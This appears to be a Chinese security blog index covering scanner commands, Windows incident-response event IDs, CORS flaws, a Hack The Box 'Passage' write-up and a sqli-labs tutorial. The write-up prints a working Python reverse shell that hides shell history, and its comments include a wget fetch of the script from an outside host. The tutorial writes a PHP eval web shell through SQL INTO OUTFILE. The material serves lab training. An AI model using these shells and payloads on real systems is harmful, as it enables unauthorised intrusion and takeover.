    
  <div class="article-category">
    <a class="article-category-link" href="/categories/src/">src</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/28/xray/">xray</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="xray常用命令"><a href="#xray常用命令" class="headerlink" title="xray常用命令"></a>xray常用命令</h1><h2 id="subdomain子域名探测"><a href="#subdomain子域名探测" class="headerlink" title="subdomain子域名探测"></a>subdomain子域名探测</h2><h3 id="基础扫描"><a href="#基础扫描" class="headerlink" title="基础扫描"></a>基础扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray subdomain --target example.com --html-output example.html</span><br></pre></td></tr></table></figure>


<h3 id="仅保存可以解析ip"><a href="#仅保存可以解析ip" class="headerlink" title="仅保存可以解析ip"></a>仅保存可以解析ip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray subdomain --target example.com --html-output example.html --ip-only </span><br></pre></td></tr></table></figure>
<h3 id="仅保存有web应用-80-443端口"><a href="#仅保存有web应用-80-443端口" class="headerlink" title="仅保存有web应用(80,443端口)"></a>仅保存有web应用(80,443端口)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray subdomain --target example.com --html-output example.html --web-only </span><br></pre></td></tr></table></figure>

<h2 id="webscan-web漏洞探测"><a href="#webscan-web漏洞探测" class="headerlink" title="webscan  web漏洞探测"></a>webscan  web漏洞探测</h2><p>使用基础爬虫爬取并扫描整个网站</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --basic-crawler http:&#x2F;&#x2F;example.com --html-output example.html</span><br></pre></td></tr></table></figure>

<p>使用 HTTP 代理进行被动扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output example.html</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<p><code> xray webscan --url http://example.com --heml-output example.html</code></p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/28/xray/" data-id="ckg3edy0j000j7es6dnwm0arg" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/28/xray/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-应急响应" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="article-date">
  <time datetime="2020-09-22T01:07:04.000Z" itemprop="datePublished">2020-09-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Misc/">Misc</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h2><ul>
<li>病毒、木马、挖矿、蠕虫</li>
<li>web服务器入侵事件、或其他服务入侵事件【web日志】</li>
<li>系统入侵事件【系统事件日志】</li>
<li>网络攻击 Dos、ARP、DNS劫持</li>
</ul>
<h2 id="排查思路"><a href="#排查思路" class="headerlink" title="排查思路"></a>排查思路</h2><p>确定事件发生的时间段，有哪些异常？站在入侵者的角度思考，摸索整个攻击流程，确定入侵的方式方法。</p>
<h3 id="分析日志文件"><a href="#分析日志文件" class="headerlink" title="分析日志文件"></a>分析日志文件</h3><h4 id="windows日志"><a href="#windows日志" class="headerlink" title="windows日志"></a>windows日志</h4><p>cmd命令行中输入：eventvwr.msc，打开windows事件查看器<br><img src="/2020/09/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1-1.jpg"></p>
<p>windows日志的位置：</p>
<p><em>windows2000 windows2003 windows XP:</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\%SystemRoot%\System32\Config\*.evt</span><br></pre></td></tr></table></figure>

<p><em>windows 7 windows 10 windows server 2008</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\%SystemRoot%\System32\winevt\Logs\*.evtx</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<p>系统日志包含windows组件的记录，例如启动过程中加载的驱动等等</p>
<p><img src="/2020/09/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1-2.jpg"></p>
<p>应用程序日志包含由windows的应用程序产生记录的日志信息，例如数据库的某些错误日志</p>
<p>安全日志包括登陆成功或者失败的登陆日志，安全事件需要掌握几个常见的事件id和登陆类型：</p>
<p>事件id：</p>
<table>
<thead>
<tr>
<th align="center">windows2000/2003/xp</th>
<th align="center">windows vista/7/8/10/2008/2012</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">528</td>
<td align="center">4624</td>
<td align="left">成功登陆</td>
</tr>
<tr>
<td align="center">529</td>
<td align="center">4625</td>
<td align="left">失败登陆</td>
</tr>
<tr>
<td align="center">680</td>
<td align="center">4776</td>
<td align="left">成功/失败的账户认证</td>
</tr>
<tr>
<td align="center">624</td>
<td align="center">4720</td>
<td align="left">创建用户</td>
</tr>
<tr>
<td align="center">636</td>
<td align="center">4732</td>
<td align="left">添加用户到启用安全性的本地组中</td>
</tr>
<tr>
<td align="center">632</td>
<td align="center">4728</td>
<td align="left">添加用户到启用安全性的全局组中</td>
</tr>
<tr>
<td align="center">2949</td>
<td align="center">7045</td>
<td align="left">服务创建成功</td>
</tr>
<tr>
<td align="center">2934</td>
<td align="center">7030</td>
<td align="left">服务创建错误</td>
</tr>
<tr>
<td align="center">2944</td>
<td align="center">7040</td>
<td align="left">IPSEC服务的启动类型从禁止更改为自启动</td>
</tr>
</tbody></table>
<p>登陆类型：</p>
<table>
<thead>
<tr>
<th align="center">登陆ID</th>
<th align="center">登陆类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">2</td>
<td align="center">interactive</td>
<td align="left">用户登陆到本机器</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">nwtwork</td>
<td align="left">用户或者计算机通过网络登陆本机,net use、net view</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">batch</td>
<td align="left">批处理登陆类型</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">service</td>
<td align="left">服务控制管理器登陆</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">unlock</td>
<td align="left">用户解锁主机</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">NetworkCleartext</td>
<td align="left">通过网络登陆主机、密码通过非hash形式传递</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">NewCredentials</td>
<td align="left">进程、线程克隆了当前令牌，但为出战连接指定了新的凭据</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">Remotelnteractive</td>
<td align="left">用户远程登陆、RDP连接信息</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">Cachedlnteractive</td>
<td align="left">用户使用本地存储的凭据登陆主机</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">CachedUnlock</td>
<td align="left">登陆尝试解锁</td>
</tr>
</tbody></table>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>#参考文献</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2524">https://xz.aliyun.com/t/2524</a></p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" data-id="ckg3edy0n000n7es6av3a4fzf" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-cors-跨域" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/21/cors-%E8%B7%A8%E5%9F%9F/" class="article-date">
  <time datetime="2020-09-21T12:17:15.000Z" itemprop="datePublished">2020-09-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Misc/">Misc</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/21/cors-%E8%B7%A8%E5%9F%9F/">cors-跨域</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>主要是用户敏感信息的泄漏，包括cookie或者json返回的账号信息等等。</p>
<h1 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h1><p>同源： 同协议、同域名、同端口</p>
<p>同源策略：不同域的客户端在没有特殊授权的情况下，不能读写对方的资源</p>
<h1 id="跨域场景"><a href="#跨域场景" class="headerlink" title="跨域场景"></a>跨域场景</h1><p>子域名对主域名的资源请求</p>
<p>多个域名之间的请求</p>
<p>第三方通信</p>
<h1 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h1><p>通常、当服务器收到header中带有origin字段的请求时，才会去配置cors跨域</p>
<p>所以我们需要发送头部带有origin字段的数据包来测试</p>
<p><img src="/2020/09/21/cors-%E8%B7%A8%E5%9F%9F/1-1.jpg"></p>
<p>如果说返回包中<em>access-control-allow-origin</em>字段是我们可以随意控制的，就证明这个站存在cors跨域漏洞。其中<em>access-control-allow-credentials</em> 字段表示可以传递cookie。</p>
<h1 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h1><p>我们需要一个存在xss的站，<a target="_blank" rel="noopener" href="http://evil.com/">http://evil.com</a> 向其中植入js代码，用来发起跨域请求。当用户访问<a target="_blank" rel="noopener" href="http://evil.com/">http://evil.com</a> 的时候不知不觉向存在cors漏洞的<a target="_blank" rel="noopener" href="http://cors.com/">http://cors.com</a> 发起跨域请求，获取<a target="_blank" rel="noopener" href="http://cors.com/">http://cors.com</a> 的敏感信息或进行敏感操作。</p>
<h1 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h1><p>没有需求，不要开启cors跨域</p>
<p>限制白名单，不要使用通配符*</p>
<p>避免使用access-control-allow-credentials、以防止cookie被窃取</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/13069099.html">https://www.cnblogs.com/Xy--1/p/13069099.html</a></p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/21/cors-%E8%B7%A8%E5%9F%9F/" data-id="ckg3edy0b00067es65rd6hzxs" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/21/cors-%E8%B7%A8%E5%9F%9F/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-ARL-src资产收集" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/13/ARL-src%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" class="article-date">
  <time datetime="2020-09-13T03:11:08.000Z" itemprop="datePublished">2020-09-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/tools/">tools</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/13/ARL-src%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/">ARL-src资产收集</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>快速侦查和目标关联的互联网资产，构建基础资产信息库。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>只支持linux、macos，我们选择用vps加docker的安装方式：</p>
<h2 id="mac安装docker"><a href="#mac安装docker" class="headerlink" title="mac安装docker"></a>mac安装docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install docker</span><br></pre></td></tr></table></figure>

<h3 id="修改安装源"><a href="#修改安装源" class="headerlink" title="修改安装源"></a>修改安装源</h3><p>preference-&gt;docker Engine中添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;debug&quot;: true,</span><br><span class="line">  &quot;experimental&quot;: false,</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull tophant&#x2F;arl 	&#x2F;&#x2F;拉取镜像</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;TophantTechnology&#x2F;ARL</span><br><span class="line">cd ARL&#x2F;docker&#x2F;</span><br></pre></td></tr></table></figure>
<p>修改docker-compose.yml 中services web image 和 services worker image 对应的镜像地址</p>
<p><img src="/2020/09/13/ARL-src%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/1-1.jpg" alt="1-1"></p>
<p>启动docker：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d	&#x2F;&#x2F;后台运行docker     </span><br><span class="line">docker-compose down	&#x2F;&#x2F;停止</span><br></pre></td></tr></table></figure>
<p>访问5003 端口即可：</p>
<p><img src="/2020/09/13/ARL-src%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/1-2.jpg" alt="1-2"></p>
<p>默认用户名密码<strong>admin/arlpass</strong></p>
<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><p>docker exec -ti arl_mongodb mongo -u admin -p admin</p>
<p>使用<code>use arl</code>切换数据库，复制docker目录下的mongo-init.js文件的内容执行进行修改密码。</p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/13/ARL-src%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="ckg3edy0500017es60q3ac6if" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/13/ARL-src%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-hack-the-box-passage" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/08/hack-the-box-passage/" class="article-date">
  <time datetime="2020-09-08T08:37:29.000Z" itemprop="datePublished">2020-09-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/games/">games</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/08/hack-the-box-passage/">hack-the-box-passage</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>配置好环境后直接访问ip地址，发现是个php写的类似论坛的网站。</p>
<p><img src="/2020/09/08/hack-the-box-passage/1-1.jpg" alt="1-1"></p>
<p>把能点的都点一遍发现这个RSS位置会产生一些奇怪的东西，如下：</p>
<p><img src="/2020/09/08/hack-the-box-passage/1-2.jpg" alt="1-2"></p>
<p>这里就暴露了一个目录<strong>CuteNews</strong>，直接访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.129.9.80&#x2F;CuteNews&#x2F;</span><br></pre></td></tr></table></figure>
<p>跳转到了登陆的入口、并且发现有注册功能：</p>
<p><img src="/2020/09/08/hack-the-box-passage/1-3.jpg" alt="1-3"></p>
<p>顺带注册一个账号，然后登陆进去，在头像上传处有任意文件上传，直接上传php一句话木马，在requests中会返回上传文件的地址。即可getshell。</p>
<p><img src="/2020/09/08/hack-the-box-passage/1-4.jpg" alt="1-4"></p>
<p>但是这个shell是www-data权限的，搜了一下hack the box 的flag 有两个，一个在用户目录下的user.txt中，还有一个在root目录下的root.txt中。我们得想办法切用户，或者提权。查看版本</p>
<p><img src="/2020/09/08/hack-the-box-passage/1-5.jpg" alt="1-5"></p>
<p>这里先反弹一个shell，方便我们提权操作,</p>
<p>在shell中上传我们的python脚本用来反弹shell（试了bash反弹，玄学原因失败了，发现有python环境，直接上脚本）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">back connect py version,only linux have pty module</span><br><span class="line">code by google security team</span><br><span class="line">wget http:&#x2F;&#x2F;0ke.org&#x2F;back.py -O &#x2F;tmp&#x2F;x.py</span><br><span class="line">python &#x2F;tmp&#x2F;x.py 120.24.234.44 12588</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import sys,os,socket,pty</span><br><span class="line">shell &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">def usage(name):</span><br><span class="line">    print &#39;python reverse connector&#39;</span><br><span class="line">    print &#39;usage: %s &lt;ip_addr&gt; &lt;port&gt;&#39; % name</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    #if len(sys.argv) !&#x3D;3:</span><br><span class="line">    #    usage(sys.argv[0])</span><br><span class="line">    #    sys.exit()</span><br><span class="line">    s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        s.connect((&quot;10.10.14.9&quot;,53))</span><br><span class="line">        print &#39;connect ok&#39;</span><br><span class="line">    except:</span><br><span class="line">        print &#39;connect faild&#39;</span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    global shell</span><br><span class="line">    os.unsetenv(&quot;HISTFILE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTFILESIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSIZE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTORY&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTSAVE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTZONE&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTLOG&quot;)</span><br><span class="line">    os.unsetenv(&quot;HISTCMD&quot;)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;,&#39;&#x2F;dev&#x2F;null&#39;)</span><br><span class="line">    os.putenv(&quot;HISTSIZE&quot;,&#39;0&#39;)</span><br><span class="line">    os.putenv(&quot;HISTFILESIZE&quot;,&#39;0&#39;)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure>
<p> 本地监听好端口后直接运行py，得到交互式shell。然而提权失败了。陷入僵局。。。</p>
<p> 我们发现在home文件夹下有两个用户: <strong>nadav 、paul</strong></p>
<p> <img src="/2020/09/08/hack-the-box-passage/1-6.jpg" alt="1-6"></p>
<p> 直接看源码吧，先打包下载<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zip -r 1.zip &#x2F;var&#x2F;www&#x2F;html&#x2F;CuteNews&#x2F;</span><br><span class="line">mv 1.zip &#x2F;var&#x2F;www&#x2F;html&#x2F;CuteNews&#x2F;uploads&#x2F;1.zip</span><br></pre></td></tr></table></figure><br> 然后访问web目录下载下来之后在源码的<code>/CuteNews/users/b0.php</code>中:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php die(&#39;Direct call - access denied&#39;); ?&gt;</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19</span><br></pre></td></tr></table></figure><br>拿去base64解开是php序列化后的数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;a:1:&#123;s:10:&quot;paul-coles&quot;;a:9:&#123;s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>使用在线的发序列化工具，得到原始对象：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [name] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [paul-coles] &#x3D;&gt; Array</span><br><span class="line">                (</span><br><span class="line">                    [id] &#x3D;&gt; 1592483236</span><br><span class="line">                    [name] &#x3D;&gt; paul-coles</span><br><span class="line">                    [acl] &#x3D;&gt; 2</span><br><span class="line">                    [email] &#x3D;&gt; paul@passage.htb</span><br><span class="line">                    [nick] &#x3D;&gt; Paul Coles</span><br><span class="line">                    [pass] &#x3D;&gt; e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd</span><br><span class="line">                    [lts] &#x3D;&gt; 1592485556</span><br><span class="line">                    [ban] &#x3D;&gt; 0</span><br><span class="line">                    [cnt] &#x3D;&gt; 2</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里拿到了e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd这个加密后的密码、cmd5解开后为** atlanta1**</p>
<p>使用反弹得到的交互式shell ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br></pre></td></tr></table></figure>

<p>输入密码：atlanta1，成功切换到paul用户,即可得到第一个flag：</p>
<p> <img src="/2020/09/08/hack-the-box-passage/1-7.jpg" alt="1-7"></p>
<p> 猜测第二个flag 要从paul的.ssh入手。。。。。未完待续</p>

      
      
    </div>
    
    <footer class="article-footer">
      
        <a data-url="http://likesoso.github.io/2020/09/08/hack-the-box-passage/" data-id="ckg3edy0800037es69tlge9ui" class="article-share-link">Share</a>
      

      
        <a href="http://likesoso.github.io/2020/09/08/hack-the-box-passage/#disqus_thread" class="article-comment-link">评论</a>
      

      
    </footer>
  </div>
  
</article>


  
    <article id="post-sqli-labs教程-3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/" class="article-date">
  <time datetime="2020-09-07T05:53:43.000Z" itemprop="datePublished">2020-09-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/sqli/">sqli</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/">sqli-labs教程(3)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        <h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><p>单引号报错<br><code>You have an error in your SQL syntax</code></p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/3-1.jpg" alt="3-1"></p>
<p>但是构造1=1 1=2 去注入是否存在时，无论是<code>?id=1&#39; and 1=1 -- -</code> ，还是<code>?id=1&#39; and 1=2 -- -</code> 页面都不正常。</p>
<p>猜测原因无非两种：<br>&nbsp;&nbsp;&nbsp;&nbsp;1.单纯一个单引号并没有闭合sql语句，可能还有括号之类的其他符号。<br>&nbsp;&nbsp;&nbsp;&nbsp;2.and作为关键字被过滤了，没起作用</p>
<p>己经测试，发现最终使用<code>?id=1&#39;)) and 1=1 -- -</code>和<code>?id=1&#39;)) and 1=2 - --</code>跟预期结果是一样的。</p>
<p>查看源码，$id果然被两个括号包裹：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br><span class="line">$result&#x3D;mysql_query($sql);</span><br><span class="line">$row &#x3D; mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
<p>这里考察的是sql写shell，我们假定已知道web网站路径。构造一下payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[x])?&gt;&#39; into outfile &#39;&#x2F;users&#x2F;likesoso&#x2F;desktop&#x2F;code&#x2F;php&#x2F;sqli-labs&#x2F;less-7&#x2F;1.php&#39; -- -</span><br></pre></td></tr></table></figure>
<p>提示语句错误，但是已经写入了shell</p>
<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-3/3-2.jpg" alt="3-2"></p>
<p>shell可以正常使用，执行ps命令：</p>
